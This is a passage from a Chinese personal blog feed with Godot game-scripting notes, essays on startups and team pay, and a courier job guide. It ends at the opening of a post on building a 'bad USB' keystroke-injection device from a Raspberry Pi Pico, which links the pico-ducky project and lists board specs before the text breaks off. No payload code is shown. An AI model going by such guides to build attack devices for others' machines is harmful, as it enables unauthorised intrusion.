Input.get_action_strength("move_left")</span><br><span class="line"></span><br><span class="line">if is_jumping:</span><br><span class="line"># animation_player.play("jump")</span><br><span class="line">pass</span><br><span class="line">elif direction == 0:</span><br><span class="line">animation_player.play("idle")</span><br><span class="line">#通过帧率对加速度进行计时判断</span><br><span class="line">if Input.is_action_pressed("move_right") or Input.is_action_pressed("move_left"):</span><br><span class="line">walk_timer += delta</span><br><span class="line">else:</span><br><span class="line">walk_timer = 0.0</span><br><span class="line">#调用反转函数</span><br><span class="line">flip_sprite(direction)</span><br><span class="line"></span><br><span class="line">func _input(event):</span><br><span class="line">if event.is_action_pressed("move_up") and not is_jumping and velocity.y == 0:</span><br><span class="line">velocity.y = -JUMP_FORCE</span><br><span class="line">is_jumping = true</span><br><span class="line"></span><br><span class="line">if event.is_action_pressed("Sprint"):</span><br><span class="line">print("冲刺")</span><br><span class="line">elif event.is_action_released("Sprint"):</span><br><span class="line">print("释放冲刺")</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func _on_trail_timer_timeout():</span><br><span class="line">if velocity.x == 0:</span><br><span class="line">return</span><br><span class="line">var trail = preload("res://effects/trail.tscn").instantiate()</span><br><span class="line">get_parent().add_child(trail)</span><br><span class="line">get_parent().move_child(trail,get_index())</span><br><span class="line">var properties = [</span><br><span class="line">"hframes",</span><br><span class="line">"vframes",</span><br><span class="line">"frame",</span><br><span class="line">"texture",</span><br><span class="line">"global_position",</span><br><span class="line">"flip_h",</span><br><span class="line">]</span><br><span class="line">for name in properties:</span><br><span class="line">trail.set(name,sprite_2d.get(name))</span><br><span class="line"></span><br><span class="line">func flip_sprite(dir):</span><br><span class="line">if dir == 1:</span><br><span class="line">#人物反转</span><br><span class="line">#print("人物右转")</span><br><span class="line">pass</span><br><span class="line">elif  dir == -1:</span><br><span class="line">#print("人物左转")</span><br><span class="line">pass</span><br><span class="line"></span><br><span class="line">func _unhandled_input(event):</span><br><span class="line">if event.is_action_pressed("move_up"):</span><br><span class="line">main_sm.dispatch(&amp;"to_jump")</span><br><span class="line">elif event.is_action_pressed("Sprint"):</span><br><span class="line">#冲刺</span><br><span class="line">pass</span><br><span class="line">elif event.is_action_pressed("attack"):</span><br><span class="line">main_sm.dispatch(&amp;"to_attack")</span><br><span class="line"></span><br><span class="line">func initate_start_machine():</span><br><span class="line">#实例化状态机</span><br><span class="line">main_sm = LimboHSM.new()</span><br><span class="line">#添加状态机</span><br><span class="line">add_child(main_sm)</span><br><span class="line"></span><br><span class="line">#创建idle状态 设置默认状态的启动方法 on_enter 首次启动调用方法 update 更新后调用方法</span><br><span class="line">var idle_state = LimboState.new().named("idle").call_on_enter(idle_start).call_on_update(idle_update)</span><br><span class="line">#创建walk状态</span><br><span class="line">var walk_state = LimboState.new().named("walk").call_on_enter(walk_start).call_on_update(walk_update)</span><br><span class="line">#创建jump状态 设置默认状态的启动方法 on_enter 首次启动调用方法 update 更新后调用方法</span><br><span class="line">var jump_state = LimboState.new().named("jump").call_on_enter(jump_start).call_on_update(jump_update)</span><br><span class="line">#创建walk状态</span><br><span class="line">var attack_state = LimboState.new().named("attack").call_on_enter(attack_start).call_on_update(attack_update)</span><br><span class="line"></span><br><span class="line">#加入状态机</span><br><span class="line">main_sm.add_child(idle_state)</span><br><span class="line">main_sm.add_child(walk_state)</span><br><span class="line">main_sm.add_child(jump_state)</span><br><span class="line">main_sm.add_child(attack_state)</span><br><span class="line"></span><br><span class="line">#设置初始状态</span><br><span class="line">main_sm.initial_state = idle_state</span><br><span class="line"></span><br><span class="line">#状态机切换</span><br><span class="line">#从闲置状态切换到行走状态</span><br><span class="line">main_sm.add_transition(idle_state,walk_state,&amp;"to_walk")</span><br><span class="line">#从任意状态都可以回到闲置状态 这也符合游戏人物移动逻辑</span><br><span class="line">main_sm.add_transition(main_sm.ANYSTATE,idle_state,&amp;"state_ended")</span><br><span class="line">#两个转换，公用一个调用方法 实现更灵活的调用</span><br><span class="line">main_sm.add_transition(idle_state,jump_state,&amp;"to_jump")</span><br><span class="line">main_sm.add_transition(walk_state,jump_state,&amp;"to_jump")</span><br><span class="line">#任何状态都可以进行攻击的切换</span><br><span class="line">main_sm.add_transition(main_sm.ANYSTATE,attack_state,&amp;"to_attack")</span><br><span class="line"></span><br><span class="line">#初始化状态机</span><br><span class="line">main_sm.initialize(self)</span><br><span class="line">#设置状态机激活状态 活动状态机</span><br><span class="line">main_sm.set_active(true)</span><br><span class="line"></span><br><span class="line">#idle的首次启动调用方法</span><br><span class="line">func idle_start():</span><br><span class="line">print("idle start")</span><br><span class="line">#可以播放闲置动画</span><br><span class="line">#idle的每帧更新调用方法</span><br><span class="line">func idle_update(delta: float):</span><br><span class="line">if velocity.x != 0:</span><br><span class="line">main_sm.dispatch(&amp;"to_walk")</span><br><span class="line">#walk的首次启动调用方法</span><br><span class="line">func walk_start():</span><br><span class="line">print("角色行走中")</span><br><span class="line">#walk的每帧更新调用方法</span><br><span class="line">func walk_update(delta: float):</span><br><span class="line">if velocity.x == 0:</span><br><span class="line">main_sm.dispatch(&amp;"state_ended")</span><br><span class="line">print("角色行走结束")</span><br><span class="line">#jump的首次启动调用方法</span><br><span class="line">func jump_start():</span><br><span class="line">#调用动画播放Jump动画</span><br><span class="line">#改变velocity.y = jump_power 来实现跳跃</span><br><span class="line">pass</span><br><span class="line">#jump的每帧更新调用方法</span><br><span class="line">func jump_update(delta: float):</span><br><span class="line">#判断跳跃是否落地</span><br><span class="line">if is_on_floor():</span><br><span class="line">#落地后切换闲置状态</span><br><span class="line">main_sm.dispatch(&amp;"state_ended")</span><br><span class="line">#attack的首次启动调用方法</span><br><span class="line">func attack_start():</span><br><span class="line">#播放攻击动画</span><br><span class="line">pass</span><br><span class="line">#attack的每帧更新调用方法</span><br><span class="line">func attack_update(delta: float):</span><br><span class="line">#当播放动画结束后，切换状态机回到闲置状态</span><br><span class="line">#由于目前没有这个动画所以只用注释解释 后续可以根据情况修改</span><br><span class="line">pass</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>视频教学:<a href="https://www.bilibili.com/video/BV1Y6421Z7sV/?spm_id_from=333.1007.top_right_bar_window_default_collection.content.click&amp;vd_source=adbd70f3395ed4825cbab1afe7aa152e">https://www.bilibili.com/video/BV1Y6421Z7sV/?spm_id_from=333.1007.top_right_bar_window_default_collection.content.click&amp;vd_source=adbd70f3395ed4825cbab1afe7aa152e</a></p><p>里面的一些状态我并没有用上，因为之前我就是直接在脚本里判断写的移动，不好桥接，所以只是做了一些演示。实际代码都用注释去讲了。</p><p>但还是一个很好的学习项目</p><h2 id="道具范围拾取检测"><a href="#道具范围拾取检测" class="headerlink" title="道具范围拾取检测"></a>道具范围拾取检测</h2><p>实现碰撞检测需要的关键节点是Area2D，它可以检测进入到区域的所有同类</p><p>这是我的Player场景构成</p><p><img src="/Blackcat-loveBlog/%5Cpng%5CQQ%E6%88%AA%E5%9B%BE20240630164451.png" alt="QQ截图20240630164451"></p><p>其中有两个CollisionShape2D，但作用完全不一样，Player下的Col节点是为了实现地面的碰撞，可以实现基础的移动，跳跃。</p><p>而Area2D，本质上不会达成碰撞，而是一个检测区域的作用。</p><p>这是我的道具场景构成：</p><p><img src="/Blackcat-loveBlog/%5Cpng%5CQQ%E6%88%AA%E5%9B%BE20240630164700.png" alt="QQ截图20240630164700"></p><p>可以看到，我使用Area2D的信号返回给了Boom节点，然后当Area2D的Coll检测到同类Arrea2D碰撞后，也就是进入这个区域内，会启动这个信号。</p><p><img src="/Blackcat-loveBlog/%5Cpng%5CQQ%E6%88%AA%E5%9B%BE20240630164818.png" alt="QQ截图20240630164818"></p><p>就这样，我们实现了基础的道具拾取检测，也可以用来完成其他的功能</p><h2 id="Tween"><a href="#Tween" class="headerlink" title="Tween"></a>Tween</h2><p>使用Tween可以通过代码直接创建动画，无需创建节点</p><p>学习视频:<a href="https://www.bilibili.com/video/BV1Cy411z7xE/?spm_id_from=333.1007.tianma.1-1-1.click&amp;vd_source=adbd70f3395ed4825cbab1afe7aa152e">https://www.bilibili.com/video/BV1Cy411z7xE/?spm_id_from=333.1007.tianma.1-1-1.click&amp;vd_source=adbd70f3395ed4825cbab1afe7aa152e</a></p><h2 id="场景切换"><a href="#场景切换" class="headerlink" title="场景切换"></a>场景切换</h2><p>实现场景切换需要三个节点</p><p>CanvasLayer 父节点</p><p>ColorRect 子节点 用来进行切换的动画效果</p><p>AnimationPlayer子节点 用来进行切换的动画效果</p><p>首先用ColorRect制作一个黑幕动画，画面从透明变成黑色</p><p>父节点脚本:</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">extends CanvasLayer</span><br><span class="line"></span><br><span class="line">@onready var animation_player = $AnimationPlayer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func _ready():</span><br><span class="line">#隐藏自身</span><br><span class="line">self.hide()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func changer_scene(path):</span><br><span class="line">self.show()</span><br><span class="line">self.set_layer(999)</span><br><span class="line">animation_player.play("changer")</span><br><span class="line">await  animation_player.animation_finished</span><br><span class="line">get_tree().change_scene_to_file(path)</span><br><span class="line">animation_player.play_backwards("changer")</span><br><span class="line">await animation_player.animation_finished</span><br><span class="line">self.set_layer(-1)</span><br><span class="line">self.hide()</span><br><span class="line">pass</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> godot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>godot学习笔记</title>
      <link href="/NANABLOG/2024/06/17/godot%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/NANABLOG/2024/06/17/godot%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>godot是一个开源的游戏引擎，支持2D 和 3D 的游戏制作 内涵丰富的插件库</p><h1 id="节点"><a href="#节点" class="headerlink" title="节点"></a>节点</h1><p>节点是godot组成的重要部分，一切的基础，不同的节点实现不同的功能</p><h2 id="Timer"><a href="#Timer" class="headerlink" title="Timer"></a>Timer</h2><p>计时器</p><h2 id="更改节点的属性"><a href="#更改节点的属性" class="headerlink" title="更改节点的属性"></a>更改节点的属性</h2><p>通过在节点上创建脚本，可以通过引用脚本的属性做出改变</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#更改节点的属性</span><br><span class="line">$Label.text = "hello world"</span><br><span class="line">$Label.modulate = Color.AQUAMARINE</span><br></pre></td></tr></tbody></table></figure><p>这里我在Main里创建了子节点Label，然后在Main节点创建脚本main.gd，通过拖动节点到脚本里，然后更改节点的属性。</p><p>将他将在ready函数里，可以在游戏启动加载的一瞬间，执行脚本一次，然后会把属性设置成我们更改好的样子</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">func _ready():</span><br><span class="line">#更改节点的属性</span><br><span class="line">$Label.text = "hello world"</span><br><span class="line">$Label.modulate = Color.AQUAMARINE</span><br></pre></td></tr></tbody></table></figure><h1 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h1><p>一个游戏包含多个场景，在场景间不同切换，最终实现无限的可能性</p><p>我们可以把场景看成一个合集，比如今天我想要创建一个人物，那么我新建一个场景，然后增加人物节点，动画节点，物理碰撞检测节点，然后写一个人物移动的脚本。</p><p>将这个场景保存后，我们在新建一个场景，实现背景的渲染和显示，之后将人物场景拖入其中，会发现人物可以在场景中走动了！</p><h1 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h1><p>使用GDscript用来编写重要的游戏逻辑，让资源，精灵，动画在合适的地方播放或者移动。</p><p>通过按住ctrl点击函数，可以直接链接到相关介绍文档</p><p>要注意的是，在GDscript中，是通过缩进的方式来区分</p><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>这些函数会在不同的状态下，和操作下去自动调用</p><h3 id="func-ready"><a href="#func-ready" class="headerlink" title="func _ready():"></a>func _ready():</h3><p>ready函数将在资源被加载的时候执行一次</p><figure class="highlight scheme"><table><tbody><tr><td class="code"><pre><span class="line">func _ready():</span><br><span class="line">pass</span><br></pre></td></tr></tbody></table></figure><h3 id="func-input-event"><a href="#func-input-event" class="headerlink" title="func _input(event):"></a>func _input(event):</h3><p>当按键被按下时，会调用这个方法，event会保存当前的按键，可以根据按键不同做出判断，比如</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#当有按钮被按下时调用</span><br><span class="line">func _input(event):</span><br><span class="line"># is_action_pressed 检测按键被按下</span><br><span class="line">if event.is_action_pressed("move_up"):</span><br><span class="line">$Label.modulate = Color.RED</span><br><span class="line"># is_action_released 检测按钮被释放</span><br><span class="line">if event.is_action_released("move_up"):</span><br><span class="line">$Label.modulate = Color.GREEN</span><br><span class="line">pass</span><br></pre></td></tr></tbody></table></figure><h3 id="随机函数"><a href="#随机函数" class="headerlink" title="随机函数"></a>随机函数</h3><p>这里我通过做一个简单的抽奖来测试随机函数,要注意的是如果需要拼接字符串可以使用str()，否则会报错</p><figure class="highlight scheme"><table><tbody><tr><td class="code"><pre><span class="line">func slot_machine():</span><br><span class="line">var roll = randf()</span><br><span class="line">if roll &lt;= <span class="number">0.8</span>:</span><br><span class="line">$roll.text = <span class="string">"谢谢惠顾"</span></span><br><span class="line">else:</span><br><span class="line">   #范围内数字的随机</span><br><span class="line">var money = randi_range(<span class="name">140</span>,<span class="number">210</span>)</span><br><span class="line">print(<span class="name">money</span>)</span><br><span class="line">$roll.text = <span class="string">"大奖！获得"</span>+str(<span class="name">money</span>)+<span class="string">"金币"</span> <span class="comment">;</span></span><br></pre></td></tr></tbody></table></figure><h3 id="储存"><a href="#储存" class="headerlink" title="储存"></a>储存</h3><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><p>使用数组存储数据，在GDscript中，数组的类型没有限制，可以同时存储多个类型的数值</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">var items = ["Potion",3,6]</span><br></pre></td></tr></tbody></table></figure><p>亦或者静态定义类型</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">var items: Array[String] = ["Potion","Feather"]</span><br></pre></td></tr></tbody></table></figure><p>使用数组通过索引 index 进行调用</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">print(items[1])</span><br></pre></td></tr></tbody></table></figure><h4 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h4><p>通过创建对象可以存储数据，并且调用很方便，对象存在键和值</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">var players = {</span><br><span class="line"></span><br><span class="line">"Lain":1,</span><br><span class="line"></span><br><span class="line">"Boss":100</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>调用</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">print(players["Lain"])</span><br></pre></td></tr></tbody></table></figure><p>更改</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">players["Lain"] = 50</span><br></pre></td></tr></tbody></table></figure><p>增加</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">players["AAA"] = 200</span><br></pre></td></tr></tbody></table></figure><h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">enum Alignment {ALLY , NEUTRAL , ENEMY}</span><br></pre></td></tr></tbody></table></figure><h3 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h3><p>通过for循环遍历数组</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">for item in items:</span><br><span class="line"></span><br><span class="line">print(item)</span><br></pre></td></tr></tbody></table></figure><p>特定次数循环</p><p>循环8次</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">for n in 8:</span><br><span class="line"></span><br><span class="line">print(n)</span><br></pre></td></tr></tbody></table></figure><h2 id="修改节点"><a href="#修改节点" class="headerlink" title="修改节点"></a>修改节点</h2><p>每次我们修改节点，都是将节点直接拖入脚本，会出现路径，但我们可以通过把节点拖入顶部，然后按ctrl再松开，这样我们会获得一个保存好节点路径的变量。</p><h2 id="移动代码学习"><a href="#移动代码学习" class="headerlink" title="移动代码学习"></a>移动代码学习</h2><p>我的写法</p><p>有Bug</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">func _process(delta):</span><br><span class="line">if plyyer.position.x &lt; -1290.413:</span><br><span class="line">camera_2d.position.x = -1290.413</span><br><span class="line">#if plyyer.position.x &gt; 965.5228:</span><br><span class="line">#camera_2d.position.x = 965.5228</span><br><span class="line">else:</span><br><span class="line">camera_2d.position = plyyer.position</span><br><span class="line">print(plyyer.position),</span><br></pre></td></tr></tbody></table></figure><p>AI优化写法</p><p>解决了Bug</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">func _process(delta):</span><br><span class="line">var camera_position = camera_2d.position</span><br><span class="line">var target_position = plyyer.position</span><br><span class="line"></span><br><span class="line">var min_x = -1290</span><br><span class="line">var max_x = 965</span><br><span class="line"></span><br><span class="line">target_position.x = clamp(target_position.x, min_x, max_x)</span><br><span class="line">camera_position = target_position</span><br><span class="line">camera_2d.position = camera_position</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> godot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>创业的一些启发</title>
      <link href="/NANABLOG/2024/06/08/%E5%88%9B%E4%B8%9A%E7%9A%84%E4%B8%80%E4%BA%9B%E5%90%AF%E5%8F%91/"/>
      <url>/NANABLOG/2024/06/08/%E5%88%9B%E4%B8%9A%E7%9A%84%E4%B8%80%E4%BA%9B%E5%90%AF%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<p>最近又看了一些创建的文章和视频，让我对创业又了新的认识和感悟，究竟什么是创业，把这个词语刨析开，创造行业，简称创业，创业本身不是开公司和复制已经有的模式，而是在有的模式基础上发展出自己的特色，真正的创造一个没有人做过的事情。</p><p>在我看来，当你资金不够的时候，适应不了大量的流量，反而做小更容易和更有效，比如我只做200个客户，对于一个人的团队和创业来说，这些也已经是一个人能接受的最大数量了，所以需要考虑的是怎么留住这200个客户，或者永远保持这200个客户，做多了，会有各种各样的风险，比如量大一旦损失也是巨大的，还有法律风险，所以维持住小量，也是一门技术，或者说是一种新的机遇。</p><p>通过阅读《影响力》一书，里面提高的概念颇为有趣，社会行为学无法在实验室得到证明，只能在那些商业活动中找到规律。</p><p>但里面至关重要的一点就是，如何让用户无意识的顺从，那些推销高手，商业大亨，无一对这方面人性的拿捏到位。</p><p>随着现如今信息获取的方面，人们获取信息的速度越来越多，这一意识也会愈发普遍，所以如何研究用户的心理，然后让交易在不知不觉中完成才是最重要的。</p><p>行为的开关，为此我们需要找到这个让用户交易成功的开关，当打开开关后，一切都会顺利成章，就像是火鸡妈妈听到叽叽声后，就会照顾孩子，物品一旦打折，便会卖的更快，亦或者涨价才行，必须找到市场中的规律，才能发现其中的机遇。</p><p>我认为真正的创业还是要靠自己发现，绝对不能随大流，超脱于当下，超越未来，超过时间。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 创业 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快递员攻略</title>
      <link href="/NANABLOG/2024/06/08/%E5%BF%AB%E9%80%92%E5%91%98%E6%94%BB%E7%95%A5/"/>
      <url>/NANABLOG/2024/06/08/%E5%BF%AB%E9%80%92%E5%91%98%E6%94%BB%E7%95%A5/</url>
      
        <content type="html"><![CDATA[<p>现在各行各业都不景气，很多人为了生存被迫出去打工，但判断一个工作是否合适取决于多种情况，很大程度上自己所想的和现实都有差别。</p><p>在网上能收集到的信息也有所偏差，所以我将自己的经历整合为攻略，但我要说明的是，由于地区不同的限制，当前地区的经济状况，攻略的实用性也飘忽不定，我会尽力客观的描述问题。</p><p>快递员，在还没有体验这个职业之前，我自己认为的每天也就是骑个三轮，去将货物送到客户手里，风吹日晒，一如既往，但是自由。</p><p>但真正经历过后，才发现有所偏差。</p><p>第一：首先是你对于这片地区的了解度，能否找到位置，可能因为我是家里蹲，出去的不多，但我自认为我对自己周边的地区还算熟悉，我第一次送货的时候，他们把货物分配到了我家周围，我才发现很多地方根本找不到，因为随着时间的流逝，牌子生锈，老小区，还有一些隐藏在角落的房屋，不营业的营业房，这些地图上根本不会有显示，还有正在建筑的小区，也是一样，想要找到只能凭借多年送货的经验。</p><p>第二：对于方向感的把控，如果你对于东南西北的感知度不是很高，很大程度上会变成路痴，平常找不到地方可以导航，大不了多走几遍，但是送货的时候你需要骑上三轮，货物很多，戴着这么多的货物在一个地方反复骑行，注意交通的同时还需要留意地址上的信息，看似容易，实际上需要胆大细心。大多数干练的快递员在找不到位置的时候在群里交流，人家给出的信息都是，某某店往东走某个牌子左拐然后某条小巷这样的信息。长时间工作后，一下子就能在脑海中找到这条路，如果是新来的，对于你送货的区域完全不熟悉的情况下，很大程度都找不到位置，你也无法不停的询问位置，只能够自己找，别人也有自己的货物送。外地当快递员我不太清楚，但我估计会更困难，作为一个十足的路痴，自己走了这么多年的区域，都需要转很长时间才找到送货点。</p><p>第三：师傅，一个足够耐心的人带你是我认为取决于能否长期干下去的动力，在你完全不了解流程的情况下，需要有人耐心的解答你的疑问，带你了解一整天的流程，但我说过，每个人都有自己的货物要送，每天的生活也很忙，很难专门为了徒弟去教，我这里基本上就是跟着送一天，当你跟着师傅去送货的时候，你会感到还好，很快很自由很轻松，但这是人家的经验积累后才能达到的速度，如果你在跟了一天后觉得自己可以，然后跟快递公司签了合同，那么恭喜你，后面的路可能会很吃力。当你自己送货的时候才发现是如此困难，刁钻的客户，不讲理的客户，难找的位置，三轮车问题等等，这些后面我会细讲，不要着急。</p><p>第四：流程，快递员一整天的流程可以分为 卸货——分拣——细分——装货到三轮——配送——配送完成后归还三轮车——随时处理可能出现的投诉电话。</p><p>不同的地区可能会有一些偏差，取决于人数，比如有些快读公司会专门招卸货人员，这样快递只需要参与分拣和之后的流程就可以，在我所所待的公司大概有五六十人左右，快递也需要参与卸货，也就是将货物从大卡车上卸下来，我们这里是快递大卡车来了后，将货物搬到另一个大卡车上，然后大卡车开到仓库，将货物扔到流水线上，然后参与分拣，所谓分拣，就是将快递扔到对应的区域，比如A小区，那么如果你看到收获地址是一个小区，就将货物扔进去。同理，一个人要尽可能将周围的区域都记住然后扔进去，当然也不是全扔，比如某个地址是A小区A号楼楼下便利店，那么就不需要扔，因为后面有具体的地址需要配送，但如果是A号楼A单元203，这样就可以扔到分拣区，因为没有写后面具体的营业房和地址，扔到分拣区后再由其他工种将这些货物统一打包专门配送。而这些具体到营业房和地址的货物之后就由快递小哥配送，也就是我们的任务。</p><p>第五：分拣，如果你也需要参与分拣，这一片章对你来说会有很大的帮助，分拣是一个考验眼力的活，流水带上的货物源源不断的袭来，你只有大概3秒钟的时间阅读货物的地址，然后判断是否扔还是放置。不同地区分拣的要求也不一样，但都是为了增加效率，我们这里是，中间有一条流水线，你站在流水线旁边，你的前方和后方都有一个有铁丝网分割的区域，理你最近的区域也是我们需要注意的区域，你能扔的最远的地方也就是最左边的格子，形成了一个九宫格，正前方，左前方，右前方，后方，左后方，右后方。每个格子都是一个派送点，可能是某某小区，某某公司楼。根据每天货物的不同，参与分拣的时间也不同，在普通日子，看你所在城市的消费水平，也就2-3卡车货物，如果在电商节，可能会暴增，也是最累的时候，同时货物更多，工资也更高。</p><p>第六：细分，细分是将需要配送的货物挑选，这需要去和其他快递员协商，确定好自己的派送区域，然后每个人一个大的铁丝网篮子，比如你是A小区，那么别人看到A小区的货物后，会扔到你的篮子，你也是一样，遇到不是自己的货物就扔到地上或者其他人的篮子。细分完成后，开始将自己篮子上的货物装货到三轮，这可是最重要的部分，不但要扫描和装货，还需要合理的摆放，因为每个人动辄就是几百件，需要提前规划好路线，最先派送的货物在最前面，最后配送的货物在最里面，这样就可以直接拿出来，这需要你对于派送地区的详细了解才能做到。如果你只是扫描装货，那么配送的时候你的脑袋没有路线规划，只是看到一个配送一个，会让你反复绕圈，浪费时间不说，还要面临投诉。</p><p>第七：配送，配送的事那真的是说也说不完了，刚开始配送的时候面对各种各样不同的人儿，还是那句话，如果你不了解的话，会很迷茫，比如说，我们平常网上购物，在填快递地址的时候，害怕自己不在家，所以将地址填成楼下便利店，让他帮忙代收一下，但你真正送到那里的时候才发现人家可能不会接收快递，因为害怕丢了或者有问题担任责任，还需要先打电话确定，才能放置，这无疑又浪费了时间。</p><p>第八：电话，送的货越来越多，你可能会频繁的接收电话，问你货物的问题，你需要耐心的回答和强大的记忆力，不然货物丢失需要你赔偿。</p><p>第九：赚钱，快递员赚钱没有底薪，全靠送货，按件算，目前市场价一件货0.8毛，一天两百件，就是160块，一开始没办法送这么多，50件，那就30几块钱，一个月也就一千多，如果在加上投诉，可能还要倒贴。当然如果你熟练的情况下，一天送400件，月入过万也不是梦，一切取决于坚持和毅力。</p><p>第十：圈子，任何职业都有自己的圈子，如果不能很好的融入圈子，就没办法解决问题，人终归是团体生物，一个人无法解决的事情，需要他人的帮忙，但人们对他人进入圈子也会考量，这一点至关重要。</p><p>目前就这么多想要说的，我试图写一份详细的攻略，对即将想要入行的同志提供一些微薄的帮助，感谢您能阅读到这里。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 职业 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初创团队遇到的分配问题及解决办法</title>
      <link href="/NANABLOG/2024/06/03/%E5%88%9D%E5%88%9B%E5%9B%A2%E9%98%9F%E9%81%87%E5%88%B0%E7%9A%84%E5%88%86%E9%85%8D%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
      <url>/NANABLOG/2024/06/03/%E5%88%9D%E5%88%9B%E5%9B%A2%E9%98%9F%E9%81%87%E5%88%B0%E7%9A%84%E5%88%86%E9%85%8D%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>如果你是一个初创业的老板，你一定遇到过以下的问题：</p><p>员工的利益怎么分配？</p><p>如果给他人的劳动定价？</p><p>早期支持者和加入者怎么区别和如何对待？</p><p>如何让作品变得更好？</p><p>其中最重要的无非两点，第一：决策的重要性，决定作品的发展取决于团队的决策，需要让正确的人去做决策，一旦决策权移位，那么代表着作品的没落。</p><p>第二：合理分配，如果是真正的公司，很多都是股票制，给予员工股票，只有公司起来，股票才会价值高，否则就很垃圾，所以员工会更加愿意工作，公司就节节高升。</p><p>很多初创产业也是施行的股票制，但股票的交易过于繁杂，所以我想着设计一种更加便捷，适用于公司内部的制度。</p><p>有点，QQ公司给员工发Q币的意思，但这里不是指的钱，而是如同股票一样的价值货币。</p><p>我称之为’贡献点’</p><p>就像是各种部落，为了让部落繁衍壮大，部落里可以使用贡献点去买东西，而贡献点需要将你的猎物或者部落需要的东西带回来，就会获得贡献点，这本质上就是印货币，只要货物足够多，就不会崩盘。</p><p>创业团队会遇到无法分配利益的问题，因为也拿不出足够多的钱，很多都是股份，但是他并不适用。</p><p>我希望再团队内容增加一个贡献点的机制，大家都是为了作品，服务的对象是作品，如果给作品提供了价值，就会获得对应的贡献点，贡献点每天都会统计和公布，贡献点没有发行限制，只要制作了，付出了劳动，就会获得。</p><p>贡献点作为作品盈利后的统计货币，当作品赚钱后，会统计市面上所有的贡献点，然后计算出每个人的占比。</p><p>然后把作品盈利的钱分发给各位。</p><p>这里的盈利是每隔一段时间后，都会重新统计。当然再股票上来说，就是分红。</p><p>一个初创团队，没有资金，发行股票在我看来，过于玄幻，所以我反而觉得这种制度，对于内部而言，或许更好。</p><p>当然也可能只是一个玩笑，只要能将劳动，价值化，那么这个方法是完全可行的，没错，我说的就是造货币。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 创业 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用树莓派做一个bad usb</title>
      <link href="/NANABLOG/2024/05/29/%E4%BD%BF%E7%94%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9A%E4%B8%80%E4%B8%AAbad-usb/"/>
      <url>/NANABLOG/2024/05/29/%E4%BD%BF%E7%94%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9A%E4%B8%80%E4%B8%AAbad-usb/</url>
      
        <content type="html"><![CDATA[<p>参考视频:</p><p><a href="https://www.bilibili.com/video/BV1o6421g7UW/?spm_id_from=333.1007.top_right_bar_window_custom_collection.content.click&amp;vd_source=adbd70f3395ed4825cbab1afe7aa152e">作者:xsTaoo 标题:物理黑客工具 Bad USB 制作教程</a></p><p><a href="github.com/dbisu/pico-ducky">原文章</a></p><p>首先在网上购买一个RP2024 Pico开发板</p><p>双核Cortex M0 主频有133MHz</p><p>USB Type-C</p><p>如果你买的是 PR2024 Pico W版本 还会多一个WiFi模块</p><p><img 